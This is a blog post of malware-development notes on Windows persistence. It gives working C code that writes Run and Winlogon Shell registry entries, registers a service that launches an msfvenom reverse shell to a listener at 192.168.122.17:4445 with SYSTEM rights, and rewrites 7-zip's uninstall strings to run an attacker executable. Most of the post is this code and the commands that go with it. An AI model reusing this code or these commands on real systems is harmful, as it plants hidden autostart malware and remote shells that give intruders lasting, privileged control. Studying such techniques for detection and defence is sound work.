---
layout: post
title: 3 MALDEV - Persistence Machanisms
category : [Reverse, MALDEV]
tags: reverse
---

# Registry Run Keys 

## Theory 

Default Windows run keys :

- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce`

Those registry key can be used to run malware, threat actor may employ techniques to create illusion that registry entries are linked to authentic programs.

## Malware C code 

```c 
#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
  MessageBoxA(NULL, "Hello, Packt!","=^..^=", MB_OK);
  return 0;
}
```

Which can be compiled with :

```bash 
 x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe  -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## Persistence C code 

```c 
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  // malicious app
  const char* exe = "Z:\\packtpub\\chapter03\\01-classic-path-registry-run-keys\\hack.exe";

  // startup
  LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
  if (result == ERROR_SUCCESS) {
    // create new registry key
    RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }
  return 0;
}
```

After executing the persistence programs, on each boot it will launch hack.exe .

# Using Registry Keys used by Winlogon process 

Winlogon process assumes responsability of faciliting user logon and logoff operations, managing system starting and shutdown procedures (and screen locking functionality). Malicious actors possess capability to modify registry entries utilized by winlogon process in order to establish enduring presence.

We need to modify those registry keys :

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
```
However to use them we need local administrator privileges.

The malware C code will be the same than above.

## Persistence C code 

```c 
#include <windows.h>
#include <string.h>
int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  // shell
  const char* sh = "explorer.exe,hack.exe";
  // startup
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\
Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0 , KEY_WRITE,
&hkey);
  if (res == ERROR_SUCCESS) {
     // create new registry key
     RegSetValueEx(hkey, (LPCSTR)"Shell", 0, REG_SZ, (unsigned char*)
sh, strlen(sh));
     RegCloseKey(hkey);
  }
  return 0;
}
```

After running the pers.c we can see :

![registry](assets/images/maldev/3/registry.png)

After a reboot it will automatically launch the hack.exe :

![result](assets/images/maldev/3/result.png)

# Dll search order hijacking for persistence

For this technique we could use the ddl search order hijacking but for a browser, running it and searching a not loaded dll with procmon.

Moreover to discover a legitimate dll we could use :

```powershell
cd C:\
dir /b /s <dll name>
```

# Exploiting Windows services for persistence

## key point about services for persistence 

- It was designed to function seamlessly over network connections 
- processes initiate automatically upon system initialization
- may have extremely elevated rights within OS 

Management of services necessitates elevated privileges, limiting access of unprivileged users to merely observing configuration settings.

Incorrect configuration of services might potentially result in privilege escalation or serve as a means of persistence. Creation of new service necessitates the use of administrator credentials and not considered a quit method of achieving persistence.

## Exemple 

### Reverse Shell 

```bash 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.122.17 LPORT=4445 -f exe > meow.exe
```

### Service that execute our meow.exe 

Minimum prerequisites :
- main entry point, similar to any programs
- concept of service entry point 
- service control handler 

```c 
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

// run process meow.exe - reverse shell
int RunMeow() {
  void * lb;
  BOOL rv;
  HANDLE th;

  // for example: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4445 -f exe > meow.exe
  char cmd[] = "Z:\\packtpub\\chapter03\\04-exploring-windows-services-for-persistence\\meow.exe";
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  ZeroMemory(&pi, sizeof(pi));
  CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
  WaitForSingleObject(pi.hProcess, INFINITE);
  CloseHandle(pi.hProcess);
  return 0;
}

int main() {
  SERVICE_TABLE_ENTRY ServiceTable[] = {
    {"MeowService", (LPSERVICE_MAIN_FUNCTION) ServiceMain},
    {NULL, NULL}
  };

  StartServiceCtrlDispatcher(ServiceTable);
  return 0;
}

void ServiceMain(int argc, char** argv) {
  serviceStatus.dwServiceType        = SERVICE_WIN32;
  serviceStatus.dwCurrentState       = SERVICE_START_PENDING;
  serviceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
  serviceStatus.dwWin32ExitCode      = 0;
  serviceStatus.dwServiceSpecificExitCode = 0;
  serviceStatus.dwCheckPoint         = 0;
  serviceStatus.dwWaitHint           = 0;

  hStatus = RegisterServiceCtrlHandler("MeowService", (LPHANDLER_FUNCTION)ControlHandler);
  RunMeow();

  serviceStatus.dwCurrentState = SERVICE_RUNNING;
  SetServiceStatus (hStatus, &serviceStatus);

  while (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
    Sleep(SLEEP_TIME);
  }
  return;
}

void ControlHandler(DWORD request) {
  switch(request) {
    case SERVICE_CONTROL_STOP:
      serviceStatus.dwWin32ExitCode = 0;
      serviceStatus.dwCurrentState  = SERVICE_STOPPED;
      SetServiceStatus (hStatus, &serviceStatus);
      return;

    case SERVICE_CONTROL_SHUTDOWN:
      serviceStatus.dwWin32ExitCode = 0;
      serviceStatus.dwCurrentState  = SERVICE_STOPPED;
      SetServiceStatus (hStatus, &serviceStatus);
      return;

    default:
      break;
  }
  SetServiceStatus(hStatus,  &serviceStatus);
  return;
}
```

We can compile it with :

```bash 
x86_64-w64-mingw32-g++ -O2 meowsrv.c -o meowsrv.exe -I/usr/share/
mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-
strings -fno-exceptions -fmerge-all-constants -static-libstdc++
-static-libgcc -fpermissive
```

On windows machine we can do :

```powershell
sc create MeowService binpath= "Z:\PATH_TO_YOUR_EXE\meowsrv.exe" start= auto
sc query MeowService
```

With that it would be created with token of system that comprises the SIDs of  `AUTHORITY\SYSTEM` and `BUILTIN\Administrators`. These SIDs grant privileged access to a majority of system objects.

The account name used universally across all locales is .\LocalSystem.

Alternatively, the designations LocalSystem or "Computer Name"\LocalSystem may also
be used. The present account lacks a password.

According MSDN doc, when utilizing `CreateService` or `ChangeServiceConfig` function and specifying the LocalSystem account, any password information that is provided will be disregarded.

We can then start service with :

```powershell
 sc start MeowService
```

It will launch the reverse shell.

Receiving the reverse shell we will have `NT AUTHORITY\SYSTEM` account.

As `meow.exe` does not function as a service, as previously said, essential components that a service must process include a primary entry point, a service entry point and a service control handler. If one attempts to generate a service solely from meow.exe file, the program terminates with an error.

So we can't launch it with :

```powershell
sc create MeowService binpath= "Z:\PATH_TO_MEOW_FILE\meow.exe" start= auto
```

In real scenario threat actor would also change already existing service.

# Hunting for persistence  : non-trivial loopholes

Many interesting methods of persistence and many are unusual and dangerous.

I.E. Hijacking uninstgall logic for application.

When application installed on windows OS, typically includes its own uninstaller, registry keys contain information :

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\<applicationname>
```

and/or :

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\QuietUninstallString\<application name>
```

There are no issues associated with substituting them with commands capable of executing alternative programs. Upon execution of uninstaller by the user, command designated by attacker is executed (modifying these entries necessitates rights).

## Example 

If we wanted to target 7-zip we could search for it's uninstall exe :

```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\7-zip" /s
```

### persistence C code 

We can use the following code c to swap the registry key :

```c 
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // target app
  const char* app = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\7-zip";

  // evil app
  const char* exe = "C:\\Users\\user\\Desktop\\packtpub\\hack.exe";

  // app
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)app, 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // update registry key value
    // reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\7-zip" /v "UninstallString" /t REG_SZ /d "...\hack.exe" /f
    RegSetValueEx(hkey, (LPCSTR)"UninstallString", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegSetValueEx(hkey, (LPCSTR)"QuietUninstallString", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }

  return 0;
}
```

![uninstall](assets/images/maldev/3/uninstall.png)

If we were looking at hack.exe in system informer we would see `SystemSettings.exe` as parent process.
